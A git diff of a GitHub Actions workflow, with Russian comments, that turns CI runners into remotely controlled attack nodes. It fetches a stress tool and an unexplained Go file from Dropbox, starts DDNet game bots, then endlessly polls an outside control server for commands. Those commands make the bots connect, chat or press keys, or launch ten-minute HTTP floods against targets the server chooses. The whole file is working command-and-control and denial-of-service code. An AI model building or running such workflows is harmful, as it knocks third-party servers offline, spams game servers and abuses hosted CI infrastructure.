@@ -1,4 +1,4 @@
-name: Ultimate 20-Machine Multi-Tool
+name: Ultimate 20-Machine Control
 on:
   workflow_dispatch:
 
@@ -18,26 +18,29 @@ jobs:
 
       - name: Download Tools
         run: |
+          # 1. Скачиваем стрессер
           wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
           wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
           
-          LINK=$(curl -s https://ddnet.org/downloads/ | grep -o 'href="[^"]*linux_x86_64.tar.xz"' | head -n 1 | cut -d'"' -f2)
-          wget -O ddnet.tar.xz "https://ddnet.org/$LINK"
+          # 2. Умное скачивание DDNet (исправляет 404)
+          PART_URL=$(curl -s https://ddnet.org/downloads/ | grep -oE 'href="[^"]+linux_x86_64.tar.xz"' | head -n 1 | cut -d'"' -f2)
+          if [[ "$PART_URL" == http* ]]; then FULL_URL="$PART_URL"; else FULL_URL="https://ddnet.org${PART_URL}"; fi
+          wget -O ddnet.tar.xz "$FULL_URL"
           tar -xf ddnet.tar.xz
           mv DDNet-* ddnet_folder
 
-      - name: Loop Control
+      - name: Loop Control Center
         env:
           CONTROL_URL: "https://me5years.alwaysdata.net/index.php?action=get"
         run: |
-          # Фоновый запуск экрана
+          # Запуск экрана
           Xvfb :99 -screen 0 1024x768x24 +extension GLX +render -noreset & sleep 3
           export DISPLAY=:99
           openbox & sleep 2
           export LIBGL_ALWAYS_SOFTWARE=1
 
-          # Запуск ботов DDNet (подготовка)
+          # Запуск ботов DDNet
           cd ddnet_folder
           for i in {1..2}; do
             cat << EOF > "bot${i}.cfg"
@@ -48,7 +51,7 @@ jobs:
             ./DDNet -f "bot${i}.cfg" > /dev/null 2>&1 & 
           done
 
-          echo "READY FOR COMMANDS FROM SITE..."
+          echo "SETUP DONE. WAITING FOR COMMANDS..."
 
           LAST_ID="0"
           while true; do
@@ -62,24 +65,24 @@ jobs:
               PORT=$(echo "$RESPONSE" | jq -r '.port')
               CONNS=$(echo "$RESPONSE" | jq -r '.conns')
 
-              # 1. КОМАНДЫ ДЛЯ DDNET БОТОВ
+              # Блок управления DDNet
               if [[ "$TYPE" == "connect" || "$TYPE" == "chat" || "$TYPE" == "disconnect" || "$TYPE" == "key" ]]; then
                 WIDS=$(xdotool search --class "DDNet" 2>/dev/null || echo "")
                 for WID in $WIDS; do
                   xdotool windowactivate --sync $WID
                   if [ "$TYPE" == "connect" ]; then
-                    xdotool key F1; sleep 0.3; xdotool type "connect $TARGET"; xdotool key Return; xdotool key F1
+                    xdotool key F1; sleep 0.2; xdotool type "connect $TARGET"; xdotool key Return; xdotool key F1
                   elif [ "$TYPE" == "chat" ]; then
-                    xdotool key t; sleep 0.3; xdotool type "$TARGET"; xdotool key Return
+                    xdotool key t; sleep 0.2; xdotool type "$TARGET"; xdotool key Return
                   elif [ "$TYPE" == "disconnect" ]; then
-                    xdotool key F1; sleep 0.3; xdotool type "disconnect"; xdotool key Return; xdotool key F1
+                    xdotool key F1; sleep 0.2; xdotool type "disconnect"; xdotool key Return; xdotool key F1
                   elif [ "$TYPE" == "key" ]; then
                     xdotool key "$TARGET"
                   fi
                 done
               fi
 
-              # 2. КОМАНДЫ ДЛЯ СТРЕСС ТЕСТОВ
+              # Блок Стресс-тестов
               if [ "$TYPE" == "http" ]; then
                 bombardier -c $CONNS -d 600s --http2 -l "$TARGET" &
               elif [ "$TYPE" == "tcp" ]; then
